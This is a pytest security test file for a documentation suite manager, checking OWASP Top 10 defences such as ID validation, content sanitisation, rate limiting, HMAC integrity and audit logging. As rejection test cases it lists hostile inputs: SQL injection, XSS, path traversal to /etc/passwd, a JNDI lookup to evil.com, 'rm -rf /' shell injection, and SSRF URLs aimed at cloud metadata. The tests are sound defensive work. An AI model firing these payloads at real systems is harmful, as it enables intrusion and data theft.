"""
Security tests for M006 Suite Manager - Pass 3: Security Hardening
DevDocAI v3.0.0

Tests OWASP Top 10 compliance and security features.
"""

import json
import time
from unittest.mock import AsyncMock, MagicMock

import pytest

from devdocai.core.storage import Document
from devdocai.core.suite import (
    MAX_CROSS_REFS,
    MAX_DOCUMENT_SIZE,
    MAX_REQUESTS_PER_WINDOW,
    MAX_SUITE_SIZE,
    ChangeType,
    InputValidator,
    RateLimiter,
    RateLimitError,
    ResourceLimitError,
    ResourceMonitor,
    SuiteConfig,
    SuiteManager,
    ValidationError,
)


class TestOWASPCompliance:
    """Test OWASP Top 10 compliance."""

    @pytest.mark.asyncio
    async def test_a01_broken_access_control(self):
        """Test A01: Broken Access Control - Document access validation."""
        manager = SuiteManager()

        # Test unauthorized access attempt (simulated)
        with pytest.raises(ValidationError):
            # Invalid suite ID should be rejected
            await manager.analyze_consistency("../../../etc/passwd")

        # Verify audit logging
        manager.enable_audit_logging()
        logs = manager.get_audit_logs()
        assert len(logs) >= 0  # Audit logs should be available

    @pytest.mark.asyncio
    async def test_a02_cryptographic_failures(self):
        """Test A02: Cryptographic Failures - Secure handling of data."""
        manager = SuiteManager()

        # Test HMAC generation for data integrity
        test_data = "sensitive_data"
        hmac1 = manager._generate_hmac(test_data)
        hmac2 = manager._generate_hmac(test_data)

        # Same data should produce same HMAC
        assert hmac1 == hmac2

        # Different data should produce different HMAC
        hmac3 = manager._generate_hmac("different_data")
        assert hmac1 != hmac3

        # HMAC verification
        assert manager._verify_hmac(test_data, hmac1)
        assert not manager._verify_hmac(test_data, "invalid_hmac")

    @pytest.mark.asyncio
    async def test_a03_injection(self):
        """Test A03: Injection - Input validation and sanitization."""
        manager = SuiteManager()
        validator = InputValidator()

        # Test SQL injection patterns
        malicious_ids = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "<script>alert('XSS')</script>",
            "../../etc/passwd",
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",  # Template injection
        ]

        for malicious_id in malicious_ids:
            assert not validator.validate_id(malicious_id), f"Should reject: {malicious_id}"

        # Test content sanitization
        xss_content = "<script>alert('XSS')</script>Hello"
        sanitized = validator.sanitize_content(xss_content)
        assert "<script>" not in sanitized
        assert "alert" not in sanitized or "&" in sanitized  # Either removed or escaped

    @pytest.mark.asyncio
    async def test_a04_insecure_design(self):
        """Test A04: Insecure Design - Rate limiting and resource protection."""
        rate_limiter = RateLimiter(5, 60)  # 5 requests per minute

        # Test rate limiting
        for i in range(5):
            assert rate_limiter.check_rate_limit("test_key")

        # 6th request should be rejected
        assert not rate_limiter.check_rate_limit("test_key")

        # Different key should have separate limit
        assert rate_limiter.check_rate_limit("different_key")

    @pytest.mark.asyncio
    async def test_a05_security_misconfiguration(self):
        """Test A05: Security Misconfiguration - Secure defaults."""
        manager = SuiteManager()

        # Audit logging should be enabled by default
        assert manager._audit_enabled

        # HMAC key should be generated
        assert manager._hmac_key is not None
        assert len(manager._hmac_key) == 32  # 256 bits

        # Rate limiter should be configured
        assert manager._rate_limiter is not None
        assert manager._rate_limiter.max_requests == MAX_REQUESTS_PER_WINDOW

    @pytest.mark.asyncio
    async def test_a06_vulnerable_components(self):
        """Test A06: Vulnerable and Outdated Components - Not directly applicable."""
        # This would be tested through dependency scanning in CI/CD
        # Placeholder for completeness
        pass

    @pytest.mark.asyncio
    async def test_a07_identity_authentication(self):
        """Test A07: Identification and Authentication Failures."""
        manager = SuiteManager()

        # Test integration with M001 security configuration
        # This would integrate with M001's authentication in production
        assert manager.config is None or hasattr(manager.config, "get_api_key")

    @pytest.mark.asyncio
    async def test_a08_software_data_integrity(self):
        """Test A08: Software and Data Integrity Failures - HMAC validation."""
        manager = SuiteManager()

        # Create a consistency report with HMAC
        suite_config = SuiteConfig(
            suite_id="test_suite", documents=[{"id": "doc1", "content": "test"}]
        )

        # Generate HMAC for data
        data = json.dumps({"suite_id": "test_suite", "score": 0.95})
        hmac_value = manager._generate_hmac(data)

        # Verify HMAC
        assert manager._verify_hmac(data, hmac_value)

        # Tampered data should fail verification
        tampered_data = json.dumps({"suite_id": "test_suite", "score": 0.50})
        assert not manager._verify_hmac(tampered_data, hmac_value)

    @pytest.mark.asyncio
    async def test_a09_security_logging(self):
        """Test A09: Security Logging and Monitoring Failures."""
        manager = SuiteManager()

        # Audit logging should be enabled
        assert manager._audit_enabled

        # Test audit log creation
        manager._log_audit_event("test_action", "test_target", {"detail": "test"})
        logs = manager.get_audit_logs()
        assert len(logs) > 0

        # Check log structure
        log = logs[-1]
        assert "timestamp" in log
        assert log["action"] == "test_action"
        assert "target" in log
        assert "details" in log

        # Test log sanitization (prevent log injection)
        manager._log_audit_event("action", "<script>alert(1)</script>", {})
        logs = manager.get_audit_logs()
        assert "<script>" not in str(logs[-1])

    @pytest.mark.asyncio
    async def test_a10_ssrf(self):
        """Test A10: Server-Side Request Forgery - Validate cross-references."""
        manager = SuiteManager()
        validator = InputValidator()

        # Test SSRF patterns in IDs
        ssrf_patterns = [
            "http://169.254.169.254/",  # AWS metadata
            "http://localhost:8080",
            "file:///etc/passwd",
            "gopher://localhost:8080",
            "dict://localhost:11211",
        ]

        for pattern in ssrf_patterns:
            assert not validator.validate_id(pattern), f"Should reject: {pattern}"


class TestRateLimiting:
    """Test rate limiting functionality."""

    def test_basic_rate_limiting(self):
        """Test basic rate limiting."""
        limiter = RateLimiter(10, 60)  # 10 requests per minute

        # First 10 requests should pass
        for i in range(10):
            assert limiter.check_rate_limit("user1"), f"Request {i+1} should pass"

        # 11th request should fail
        assert not limiter.check_rate_limit("user1"), "11th request should fail"

    def test_time_window_reset(self):
        """Test rate limit window reset."""
        limiter = RateLimiter(2, 1)  # 2 requests per second

        # Use up the limit
        assert limiter.check_rate_limit("user1")
        assert limiter.check_rate_limit("user1")
        assert not limiter.check_rate_limit("user1")

        # Wait for window to reset
        time.sleep(1.1)

        # Should be able to make requests again
        assert limiter.check_rate_limit("user1")

    def test_per_key_limits(self):
        """Test that rate limits are per-key."""
        limiter = RateLimiter(2, 60)

        # User1 uses their limit
        assert limiter.check_rate_limit("user1")
        assert limiter.check_rate_limit("user1")
        assert not limiter.check_rate_limit("user1")

        # User2 should still have their limit
        assert limiter.check_rate_limit("user2")
        assert limiter.check_rate_limit("user2")
        assert not limiter.check_rate_limit("user2")


class TestInputValidation:
    """Test input validation and sanitization."""

    def test_id_validation(self):
        """Test ID validation."""
        validator = InputValidator()

        # Valid IDs
        valid_ids = [
            "doc_123",
            "api-doc",
            "readme.md",
            "user_profile_2024",
            "test-file-name",
        ]

        for valid_id in valid_ids:
            assert validator.validate_id(valid_id), f"Should accept: {valid_id}"

        # Invalid IDs
        invalid_ids = [
            "",  # Empty
            "a",  # Too short
            "a" * 300,  # Too long
            "../etc/passwd",  # Path traversal
            "doc<script>",  # HTML
            "doc;rm -rf /",  # Shell injection
            "doc\x00null",  # Null byte
            "javascript:alert(1)",  # XSS
            "data:text/html,test",  # Data URL
        ]

        for invalid_id in invalid_ids:
            assert not validator.validate_id(invalid_id), f"Should reject: {invalid_id}"

    def test_content_sanitization(self):
        """Test content sanitization."""
        validator = InputValidator()

        # Test HTML escaping
        html_content = "<div>Hello</div>"
        sanitized = validator.sanitize_content(html_content)
        assert "<div>" not in sanitized
        assert "&lt;div&gt;" in sanitized or "div" in sanitized

        # Test script removal
        script_content = "Hello <script>alert(1)</script> World"
        sanitized = validator.sanitize_content(script_content)
        assert "<script>" not in sanitized
        assert "alert" not in sanitized or "&" in sanitized

        # Test event handler removal
        event_content = '<img src=x onerror="alert(1)">'
        sanitized = validator.sanitize_content(event_content)
        assert "onerror" not in sanitized or "=" not in sanitized

        # Test JavaScript protocol
        js_content = '<a href="javascript:alert(1)">Click</a>'
        sanitized = validator.sanitize_content(js_content)
        assert "javascript:" not in sanitized


class TestResourceLimits:
    """Test resource limit enforcement."""

    @pytest.mark.asyncio
    async def test_suite_size_limit(self):
        """Test suite size limit enforcement."""
        # Create config with too many documents
        docs = [{"id": f"doc_{i}"} for i in range(MAX_SUITE_SIZE + 1)]

        with pytest.raises(ResourceLimitError):
            SuiteConfig(suite_id="test_suite", documents=docs)

    @pytest.mark.asyncio
    async def test_document_size_limit(self):
        """Test document size limit enforcement."""
        # Create oversized document
        large_content = "x" * (MAX_DOCUMENT_SIZE + 1)

        with pytest.raises(ResourceLimitError):
            SuiteConfig(suite_id="test_suite", documents=[{"id": "doc1", "content": large_content}])

    @pytest.mark.asyncio
    async def test_cross_reference_limit(self):
        """Test cross-reference limit enforcement."""
        # Create too many cross-references
        refs = {
            f"doc_{i}": [f"ref_{j}" for j in range(100)] for i in range(MAX_CROSS_REFS // 100 + 1)
        }

        with pytest.raises(ResourceLimitError):
            SuiteConfig(suite_id="test_suite", documents=[{"id": "doc1"}], cross_references=refs)

    def test_resource_monitor(self):
        """Test resource monitoring."""
        monitor = ResourceMonitor()

        # Should allow operations when resources available
        # (actual result depends on system state)
        result = monitor.check_resources()
        assert isinstance(result, bool)


class TestAuditLogging:
    """Test audit logging functionality."""

    def test_audit_log_creation(self):
        """Test audit log creation."""
        manager = SuiteManager()

        # Create audit log
        manager._log_audit_event("test_action", "test_target", {"key": "value"})

        logs = manager.get_audit_logs()
        assert len(logs) > 0

        log = logs[-1]
        assert log["action"] == "test_action"
        assert "test_target" in log["target"]
        assert log["details"]["key"] == "value"
        assert "timestamp" in log

    def test_audit_log_sanitization(self):
        """Test that audit logs are sanitized."""
        manager = SuiteManager()

        # Try to inject malicious content
        manager._log_audit_event(
            "action", "<script>alert(1)</script>", {"xss": "<img src=x onerror=alert(1)>"}
        )

        logs = manager.get_audit_logs()
        log_str = str(logs[-1])

        # Malicious content should be escaped or removed
        assert "<script>" not in log_str or "&lt;script&gt;" in log_str
        assert "onerror=" not in log_str

    def test_audit_log_limit(self):
        """Test that audit logs don't grow unbounded."""
        manager = SuiteManager()

        # Create many logs
        for i in range(manager._max_audit_logs + 100):
            manager._log_audit_event(f"action_{i}", f"target_{i}", {})

        # Should not exceed max
        logs = manager.get_audit_logs()
        assert len(logs) <= manager._max_audit_logs


class TestSecurityIntegration:
    """Test security feature integration."""

    @pytest.mark.asyncio
    async def test_generate_suite_security(self):
        """Test security in suite generation."""
        manager = SuiteManager()

        # Test with malicious suite ID
        with pytest.raises(ValidationError):
            config = SuiteConfig(suite_id="../../etc/passwd", documents=[{"id": "doc1"}])

    @pytest.mark.asyncio
    async def test_analyze_consistency_security(self):
        """Test security in consistency analysis."""
        manager = SuiteManager()

        # Test with malicious suite ID
        with pytest.raises(ValidationError):
            await manager.analyze_consistency("<script>alert(1)</script>")

    @pytest.mark.asyncio
    async def test_analyze_impact_security(self):
        """Test security in impact analysis."""
        manager = SuiteManager()

        # Test with malicious document ID
        with pytest.raises(ValidationError):
            await manager.analyze_impact("'; DROP TABLE documents; --", ChangeType.UPDATE)

    @pytest.mark.asyncio
    async def test_rate_limiting_integration(self):
        """Test rate limiting in actual operations."""
        manager = SuiteManager()

        # Make many rapid requests
        request_count = 0
        rate_limit_hit = False

        # Use a more aggressive rate limit for testing
        manager._rate_limiter = RateLimiter(3, 60)

        for i in range(10):
            try:
                # This will check rate limits internally
                await manager.analyze_consistency(f"suite_{i}")
                request_count += 1
            except RateLimitError:
                rate_limit_hit = True
                break
            except Exception:
                # Other exceptions (like missing documents) are OK for this test
                request_count += 1

        # Should hit rate limit before all requests complete
        assert rate_limit_hit or request_count <= 3


class TestHMACValidation:
    """Test HMAC validation for data integrity."""

    def test_hmac_generation(self):
        """Test HMAC generation."""
        manager = SuiteManager()

        data1 = "test data"
        data2 = "test data"
        data3 = "different data"

        hmac1 = manager._generate_hmac(data1)
        hmac2 = manager._generate_hmac(data2)
        hmac3 = manager._generate_hmac(data3)

        # Same data should produce same HMAC
        assert hmac1 == hmac2

        # Different data should produce different HMAC
        assert hmac1 != hmac3

        # HMAC should be hex string
        assert all(c in "0123456789abcdef" for c in hmac1)

    def test_hmac_verification(self):
        """Test HMAC verification."""
        manager = SuiteManager()

        data = "important data"
        correct_hmac = manager._generate_hmac(data)

        # Correct HMAC should verify
        assert manager._verify_hmac(data, correct_hmac)

        # Incorrect HMAC should fail
        assert not manager._verify_hmac(data, "wrong_hmac")

        # Modified data should fail
        assert not manager._verify_hmac("tampered data", correct_hmac)

    @pytest.mark.asyncio
    async def test_consistency_report_hmac(self):
        """Test that consistency reports include HMAC."""
        manager = SuiteManager()

        # Mock storage to return test documents
        manager.storage = MagicMock()
        manager.storage.list_documents = AsyncMock(return_value=["doc1"])
        manager.storage.get_document = AsyncMock(
            return_value=Document(id="doc1", content="test", type="markdown")
        )

        # Analyze consistency
        report = await manager.analyze_consistency("test_suite")

        # Report should include HMAC
        assert "integrity_hmac" in report.details
        assert report.details["integrity_hmac"] is not None

        # HMAC should be valid
        report_data = json.dumps(
            {
                "suite_id": report.suite_id,
                "consistency_score": report.consistency_score,
                "coverage_percentage": report.coverage_percentage,
                "reference_integrity": report.reference_integrity,
            }
        )

        assert manager._verify_hmac(report_data, report.details["integrity_hmac"])


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
